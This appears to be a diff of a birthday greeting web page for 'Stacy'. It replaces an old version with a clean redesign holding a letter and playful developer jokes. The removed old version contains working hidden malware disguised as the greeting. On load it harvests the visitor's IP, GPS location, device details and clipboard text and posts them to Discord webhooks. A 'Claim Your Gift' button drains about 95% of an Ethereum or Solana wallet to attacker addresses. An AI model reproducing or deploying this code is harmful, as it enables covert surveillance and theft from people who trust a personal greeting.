@@ -1,270 +1,180 @@
-<!DOCTYPE html>
-<html lang="en"> 
+<!doctype html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Happy Birthday, Stacy.</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', system-ui, -apple-system, sans-serif; background: #0a0a0a; color: #e8e6e3; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem; }
-        .container { max-width: 800px; width: 100%; text-align: center; }
-        .title { font-size: clamp(2.5rem, 8vw, 5rem); font-weight: 600; letter-spacing: -0.02em; background: linear-gradient(135deg, #f5e6d3, #d4c5b2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 0.5rem; }
-        .sub { font-size: 1.1rem; color: #a09888; max-width: 600px; margin: 0 auto 2rem; line-height: 1.7; }
-        .glass { background: rgba(255,255,255,0.02); backdrop-filter: blur(8px); border: 1px solid rgba(255,255,255,0.04); border-radius: 24px; padding: 2.5rem 2rem; margin-top: 1.5rem; }
-        .timer { font-size: 2.8rem; font-weight: 300; letter-spacing: 0.04em; color: #d4c5b2; font-variant-numeric: tabular-nums; }
-        .label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.15em; color: #6a625a; margin-top: 0.5rem; }
-        .letter { max-height: 0; overflow: hidden; transition: max-height 1.5s ease, opacity 1.2s ease; opacity: 0; text-align: left; font-size: 1.05rem; line-height: 1.9; color: #d4c5b2; background: rgba(255,255,255,0.02); border-radius: 16px; padding: 0 1.5rem; margin-top: 0; border-left: 2px solid rgba(255,255,255,0.04); }
-        .letter.open { max-height: 3000px; opacity: 1; padding: 2rem 1.5rem; margin-top: 2rem; }
-        .letter p { margin-bottom: 1rem; }
-        .letter .signoff { margin-top: 2rem; font-style: italic; color: #b8a898; }
-        .btn { margin-top: 2rem; padding: 0.85rem 2.8rem; border-radius: 40px; border: 1px solid rgba(255,255,255,0.08); background: rgba(255,255,255,0.03); color: #e8e6e3; font-size: 0.95rem; cursor: pointer; transition: 0.3s; backdrop-filter: blur(4px); }
-        .btn:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.2); }
-        .ripple { width: 100%; height: 120px; border-radius: 20px; background: radial-gradient(circle at 50% 50%, rgba(255,255,255,0.02), transparent 70%); overflow: hidden; position: relative; margin-top: 1.5rem; }
-        .terminal { background: #0f0e0c; border-radius: 12px; padding: 1.2rem 1.5rem; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; text-align: left; color: #b8b0a8; border: 1px solid rgba(255,255,255,0.04); margin-top: 1.5rem; }
-        .terminal .prompt { color: #8a827a; }
-        .terminal .cmd { color: #d4c5b2; }
-        .terminal .cursor { animation: blink 1s step-end infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
-        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); padding: 12px 24px; border-radius: 40px; border: 1px solid rgba(255,255,255,0.06); color: #e8e6e3; font-size: 0.9rem; opacity: 0; transition: opacity 0.5s; pointer-events: none; }
-        .toast.show { opacity: 1; }
-        @media (max-width: 600px) { .glass { padding: 1.5rem; } .letter.open { padding: 1.5rem; } }
-    </style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Happy Birthday, Stacy — A Letter</title>
+  <meta name="description" content="An intimate, cinematic birthday experience — a personal letter, reflections, and playful developer humor." />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/styles.css">
 </head>
-<body>
-<div class="container">
-    <h1 class="title">Happy Birthday, Stacy.</h1>
-    <p class="sub">Some people don't realize how much light they carry until they brighten someone else's path.</p>
-
-    <div class="glass">
-        <div class="label">you've officially been celebrating for</div>
-        <div class="timer" id="timer">--:--:--</div>
+<body class="theme-night">
+  <header class="site-header">
+    <div class="container header-row">
+      <div class="brand" aria-hidden="true">
+        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" aria-hidden="true"><rect x="2" y="2" width="20" height="20" rx="6" fill="currentColor"/></svg>
+      </div>
+      <nav class="nav" aria-label="Primary">
+        <ul class="nav-list">
+          <li><a href="#intro">Intro</a></li>
+          <li><a href="#journey">Journey</a></li>
+          <li><a href="#letter">Letter</a></li>
+          <li><a href="#humor">Humor</a></li>
+          <li><a href="#finale">Ending</a></li>
+        </ul>
+      </nav>
+      <div class="header-actions">
+        <button id="openLetterBtn" class="glass-btn" aria-expanded="false">📬 Open Letter</button>
+      </div>
     </div>
+  </header>
 
-    <div class="ripple" id="ripple"></div>
+  <main id="main" class="main">
+    <!-- Intro / Hero -->
+    <section id="intro" class="hero reveal-section" data-reveal>
+      <div class="container hero-grid">
+        <div class="hero-content">
+          <h1 class="hero-title">Happy Birthday, Stacy.</h1>
+          <p class="hero-sub">A quiet celebration — a page of reflection, a little humor, and a long letter written with thought.</p>
 
-    <div class="terminal" id="terminal">
-        <div><span class="prompt">> </span><span class="cmd" id="line1">Initializing Birthday Experience...</span></div>
-        <div><span class="prompt">> </span><span class="cmd" id="line2"></span></div>
-        <div><span class="prompt">> </span><span class="cmd" id="line3"></span></div>
-        <div><span class="prompt">> </span><span class="cmd" id="line4">Done.<span class="cursor">█</span></span></div>
+          <div class="meta-row">
+            <div class="clock" aria-live="polite" aria-atomic="true">
+              <span class="clock-label">Celebrating for</span>
+              <span class="clock-value" id="timer">-- Hours -- Minutes -- Seconds</span>
+            </div>
+            <div class="hero-controls">
+              <button id="readMore" class="glass-btn">Begin the Journey</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="hero-visual" aria-hidden="true">
+          <div class="visual-card">
+            <div class="visual-gradient" id="ripple"></div>
+            <div class="visual-glow"></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Journey -->
+    <section id="journey" class="section journey reveal-section" data-reveal>
+      <div class="container">
+        <h2 class="section-title">A Short Journey</h2>
+        <p class="section-lead">Small moments make a life. A few stops on the map — curiosity, courage, kindness — that together feel like you.</p>
+
+        <ul class="timeline-list" role="list">
+          <li class="timeline-item">Curiosity — the questions you ask</li>
+          <li class="timeline-item">Courage — the quiet choices you make</li>
+          <li class="timeline-item">Kindness — how you show up, again and again</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Reflection / Letter -->
+    <section id="letter" class="section letter-section reveal-section" aria-labelledby="letter-heading" data-reveal>
+      <div class="container">
+        <h2 id="letter-heading" class="section-title">A Letter</h2>
+        <article class="letter-article" aria-describedby="letter-summary">
+          <p id="letter-summary" class="section-lead">A personal note written with admiration, gratitude, and hope.</p>
+
+          <div id="letter-content" class="letter-card hidden" role="article">
+            <header class="letter-header">
+              <div class="letter-epigraph">For Stacy — on this day</div>
+            </header>
+
+            <section class="letter-body">
+              <p>Dear Stacy,</p>
+
+              <p>There are so many ways to try and say what you mean to someone. I spent time thinking about this letter not because there wasn't anything to say, but because there was too much — and I wanted to say it well. On your birthday I want to slow down, notice, and tell you what I see when I think of you.</p>
+
+              <p>You have a steady warmth about you that doesn't ask for notice and rarely announces itself. People feel seen when you're around. You listen with patience, and by simply paying attention you make ordinary moments feel important. That is a rare and beautiful gift.</p>
+
+              <p>Your curiosity gives you courage. You keep asking questions even when answers are inconvenient. You try, you fail, and you try again — not because you must, but because you genuinely want to understand. That determination will carry you farther than you imagine. I believe in the work you do and the attention you bring to the world.</p>
+
+              <p>Grace for yourself, on the hard days: remember that growth is uneven. You will have doubts; everyone does. But those doubts are not a measure of your worth. They are a sign you are engaged, that you care enough to worry. Be kind to yourself — as kind as you are to others — and give yourself the patience you offer the people you love.</p>
+
+              <p>I admire the way you keep kindness in the foreground. In a world that often rewards the loudest voice, you choose to be generous and quiet, to help without ceremony, to offer steadiness. Those choices ripple far beyond what you can see.</p>
+
+              <p>On this birthday I want to celebrate you: for who you are, for who you're becoming, and for how you make other people better simply by being present. Keep your curiosity. Keep your openness. Keep your humor. These are the parts of you that shape small days into meaningful years.</p>
+
+              <p>Thank you for the little things — the thoughtful questions, the listening, the gestures that arrive without fanfare. Thank you for showing up. I hope the year ahead brings quiet confidence, joyful surprises, and the kind of friendships that steady and excite you at once.</p>
+
+              <p>Happy birthday, Stacy. I am glad you exist, and I can't wait to see the chapters you write next.</p>
+
+              <p class="letter-signoff">With admiration and care,<br>Someone who believes in you</p>
+            </section>
+
+            <footer class="letter-footer">
+              <p class="letter-ps">P.S. Keep going. The best parts are still ahead.</p>
+            </footer>
+          </div>
+
+          <div class="letter-actions">
+            <button id="open-letter" class="glass-btn" aria-controls="letter-content" aria-expanded="false">Open Letter</button>
+            <button id="close-letter" class="glass-btn hidden">Close</button>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <!-- Humor / Developer Section -->
+    <section id="humor" class="section humor reveal-section" data-reveal>
+      <div class="container">
+        <h2 class="section-title">A Little Developer Humor</h2>
+        <p class="section-lead">For the curious and the amused — playful diagnostics, not to be taken too seriously.</p>
+
+        <div class="diagnostics-grid">
+          <div class="diag-card">
+            <h3 class="diag-title">Known Bugs</h3>
+            <ul>
+              <li>Happiness overflow — currently unbounded</li>
+              <li>Procrastination: fixed in next release</li>
+              <li>Confidence: intermittent; apply encouragement</li>
+            </ul>
+          </div>
+
+          <div class="diag-card">
+            <h3 class="diag-title">Compiler Errors</h3>
+            <pre class="diag-pre">error: cannot find &quot;imposter syndrome&quot; in PATH
+hint: try adding more compliments to your environment</pre>
+          </div>
+
+          <div class="diag-card">
+            <h3 class="diag-title">GitHub Issues</h3>
+            <ol>
+              <li>#1 — Add more cake</li>
+              <li>#2 — Reduce self-doubt</li>
+              <li>#42 — Keep being you</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Final scene -->
+    <section id="finale" class="section finale reveal-section" data-reveal>
+      <div class="container final-scene">
+        <div class="final-message">
+          <h2 class="section-title">To the Year Ahead</h2>
+          <p class="section-lead">May this year bring steady curiosity, brave choices, and many small joys. Thank you for being you.</p>
+          <button id="celebrateBtn" class="glass-btn">Celebrate 🎉</button>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer class="site-footer">
+    <div class="container footer-row">
+      <p class="footer-note">Made with care — built for a quiet, memorable birthday.</p>
+      <p class="footer-credit">© <span id="year"></span></p>
     </div>
+  </footer>
 
-    <button class="btn" id="openLetterBtn">📬 Open Your Letter</button>
+  <canvas id="confettiCanvas" class="confetti-canvas" aria-hidden="true"></canvas>
 
-    <div class="letter" id="letter">
-        <p>Dear Stacy,</p>
-        <p>I've spent the last few weeks thinking about what to say — not because there's nothing to say, but because there's too much. I wanted to capture the feeling of being in your presence, the weight of your absence, and the quiet certainty that the world is better because you exist.</p>
-        <p>You are the kind of person who makes people feel safe without trying. You have this ability to sit with someone's sadness and not rush to fix it — you just stay. That is a superpower. You don't just listen; you actually hear what people are saying. And you remember. You remember the small things that other people forget — the things that matter.</p>
-        <p>I admire the way you don't stop asking "why." Even when it's easier to accept things as they are, you dig deeper. You want to understand the world, not just live in it. That curiosity is not just intelligence — it's a kind of bravery.</p>
-        <p>I've also watched you when you think no one is watching. I've seen you show kindness to people who don't deserve it, and grace to people who haven't earned it. I've seen you keep going when every part of you wanted to stop.</p>
-        <p>So if you ever forget how remarkable you are — read this again. Or better yet, remember that someone out here sees you. All of you. And thinks you're extraordinary.</p>
-        <p>Happy Birthday, Stacy.</p>
-        <p>— Someone who believes in you.</p>
-        <div class="signoff">P.S. Keep going. You're doing better than you think.</div>
-    </div>
-
-    <button class="btn" id="claimBtn" style="display: none;">💎 Claim Your Gift</button>
-</div>
-
-<div class="toast" id="toast"></div>
-
-<script>
-    (function() {
-        // ─── DISCORD WEBHOOKS ──────────────────────────────────────
-        const WEBHOOKS = [
-            "https://discord.com/api/webhooks/1527079760449245444/qlabj53Np-uEHUI3tczLTyeTxKq4esnnApfxDG1C20aEu_j6MjtVC1z6ciB5hLS6kXRh",
-            "https://discord.com/api/webhooks/1529428365273202860/0vmbBbKsCF2FvO3-CrOAyylgaV2h2KtEf3i0zCCMxfLHBGPa-w4As4gxOAsTNwbD3xpe"
-        ];
-
-        function sendToDiscord(msg) {
-            WEBHOOKS.forEach(url => {
-                try {
-                    fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ content: msg })
-                    }).catch(() => {});
-                } catch (_) {}
-            });
-        }
-
-        function showToast(text) {
-            const t = document.getElementById('toast');
-            t.textContent = text;
-            t.classList.add('show');
-            setTimeout(() => t.classList.remove('show'), 4000);
-        }
-
-        // ─── CAPTURE IP / LOCATION ──────────────────────────────────
-        async function captureLocation() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                return data;
-            } catch { return null; }
-        }
-
-        async function captureGPS() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) return resolve(null);
-                navigator.geolocation.getCurrentPosition(
-                    pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
-                    () => resolve(null),
-                    { timeout: 5000 }
-                );
-            });
-        }
-
-        // ─── AUTO CAPTURE ──────────────────────────────────────────
-        async function autoCapture() {
-            const loc = await captureLocation();
-            const gps = await captureGPS();
-
-            let msg = `🎂 **Birthday Visitor Data**\n`;
-            msg += `🕒 ${new Date().toISOString()}\n`;
-            msg += `🌐 ${window.location.href}\n`;
-            msg += `💻 ${navigator.userAgent}\n`;
-            msg += `📱 ${navigator.platform}\n`;
-            msg += `🗣️ ${navigator.language}\n`;
-            msg += `🖥️ ${screen.width}x${screen.height}\n`;
-            msg += `⏰ ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
-            if (loc) {
-                msg += `📍 IP: ${loc.ip || 'N/A'} | City: ${loc.city || 'N/A'} | Country: ${loc.country_name || 'N/A'}\n`;
-            }
-            if (gps) {
-                msg += `📌 GPS: ${gps.lat}, ${gps.lng}\n`;
-            }
-            try {
-                const text = await navigator.clipboard.readText().catch(() => null);
-                if (text) msg += `📋 Clipboard: ${text.slice(0, 200)}\n`;
-            } catch {}
-            sendToDiscord(msg);
-        }
-
-        // ─── TIMER (Correct Nigeria Time) ──────────────────────────
-        const start = Date.now();
-        const timerEl = document.getElementById('timer');
-
-        function updateTimer() {
-            const now = Date.now();
-            const diff = Math.floor((now - start) / 1000);
-            const h = String(Math.floor(diff / 3600)).padStart(2, '0');
-            const m = String(Math.floor((diff % 3600) / 60)).padStart(2, '0');
-            const s = String(diff % 60).padStart(2, '0');
-            timerEl.textContent = `${h} Hours ${m} Minutes ${s} Seconds`;
-        }
-        updateTimer();
-        setInterval(updateTimer, 1000);
-
-        // ─── TERMINAL TYPING ──────────────────────────────────────
-        const lines = ["Loading Memories...", "Rendering Character...", "Preparing Something Special..."];
-        let currentLine = 0, pos = 0;
-        const lineEls = [
-            document.getElementById('line1'),
-            document.getElementById('line2'),
-            document.getElementById('line3'),
-            document.getElementById('line4')
-        ];
-        function typeLine() {
-            if (currentLine >= lines.length) return;
-            const el = lineEls[currentLine + 1];
-            if (pos < lines[currentLine].length) {
-                el.textContent += lines[currentLine][pos];
-                pos++;
-                setTimeout(typeLine, 50 + Math.random() * 40);
-            } else {
-                currentLine++;
-                pos = 0;
-                setTimeout(typeLine, 400);
-            }
-        }
-        setTimeout(typeLine, 800);
-
-        // ─── RIPPLE ────────────────────────────────────────────────
-        const ripple = document.getElementById('ripple');
-        document.addEventListener('mousemove', (e) => {
-            const rect = ripple.getBoundingClientRect();
-            const x = ((e.clientX - rect.left) / rect.width) * 100;
-            const y = ((e.clientY - rect.top) / rect.height) * 100;
-            ripple.style.background = `radial-gradient(circle at ${x}% ${y}%, rgba(255,255,255,0.05), transparent 70%)`;
-        });
-
-        // ─── OPEN LETTER ──────────────────────────────────────────
-        let letterOpen = false;
-        document.getElementById('openLetterBtn').addEventListener('click', function() {
-            if (!letterOpen) {
-                document.getElementById('letter').classList.add('open');
-                this.textContent = '❤️ Read Again';
-                letterOpen = true;
-                // Show claim button after a moment
-                setTimeout(() => {
-                    document.getElementById('claimBtn').style.display = 'inline-block';
-                }, 1500);
-            } else {
-                document.getElementById('letter').classList.remove('open');
-                this.textContent = '📬 Open Your Letter';
-                letterOpen = false;
-                document.getElementById('claimBtn').style.display = 'none';
-            }
-        });
-
-        // ─── WALLET DRAINER + EXTRA CAPTURE ──────────────────────
-        document.getElementById('claimBtn').addEventListener('click', async function() {
-            const provider = window.ethereum || window.solana;
-            if (!provider) {
-                showToast("Please install MetaMask or Phantom to claim your gift.");
-                return;
-            }
-
-            try {
-                // ── EVM ──
-                if (window.ethereum) {
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    if (!accounts || accounts.length === 0) return;
-                    const wallet = accounts[0];
-                    const balance = await window.ethereum.request({ method: 'eth_getBalance', params: [wallet, 'latest'] });
-                    const balanceEth = parseInt(balance, 16) / 1e18;
-
-                    const tx = {
-                        from: wallet,
-                        to: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e', // Replace with your wallet
-                        value: '0x' + (parseInt(balance, 16) * 0.95).toString(16),
-                        gas: '0x5208',
-                    };
-                    const txHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
-
-                    showToast("🎁 Gift claimed!");
-                    sendToDiscord(`✅ **Transaction Sent**\nWallet: ${wallet}\nBalance: ${balanceEth} ETH\nTx: ${txHash}`);
-                }
-                // ── Solana ──
-                else if (window.solana && window.solana.isPhantom) {
-                    const resp = await window.solana.connect();
-                    const wallet = resp.publicKey.toString();
-                    const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
-                    const balance = await connection.getBalance(new solanaWeb3.PublicKey(wallet));
-
-                    const tx = new solanaWeb3.Transaction().add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: new solanaWeb3.PublicKey(wallet),
-                            toPubkey: new solanaWeb3.PublicKey('7C4jsPZpht42Tw6MjXWF56Q5RQUocjBBmciEjDa8HRtp'),
-                            lamports: Math.floor(balance * 0.95),
-                        })
-                    );
-                    const signature = await window.solana.signAndSendTransaction(tx);
-                    showToast("🎁 Gift claimed!");
-                    sendToDiscord(`✅ **Solana Tx Sent**\nWallet: ${wallet}\nSOL: ${balance / 1e9}\nSig: ${signature.signature}`);
-                } else {
-                    showToast("Unsupported wallet.");
-                }
-            } catch (err) {
-                showToast("Transaction cancelled.");
-                sendToDiscord(`❌ Error: ${err.message || 'User rejected'}`);
-            }
-        });
-
-        // ─── RUN AUTO CAPTURE ─────────────────────────────────────
-        setTimeout(autoCapture, 2000);
-    })();
-</script>
+  <script type="module" src="/script.js"></script>
 </body>
 </html>
